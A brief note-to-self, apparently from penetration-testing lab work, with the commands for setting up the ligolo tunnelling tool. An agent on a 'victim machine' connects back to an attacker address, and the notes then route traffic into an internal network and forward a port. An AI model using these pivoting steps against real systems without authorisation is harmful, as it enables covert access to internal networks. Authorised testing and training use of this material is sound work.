#ligolo setup
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
.\agent.exe -connect 192.168.45.236:11601 -retry -ignore-cert(on victim machine)
./proxy -selfcert
session
1
start
sudo ip route add 10.10.182.0/24 dev ligolo(on another terminal)


listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80
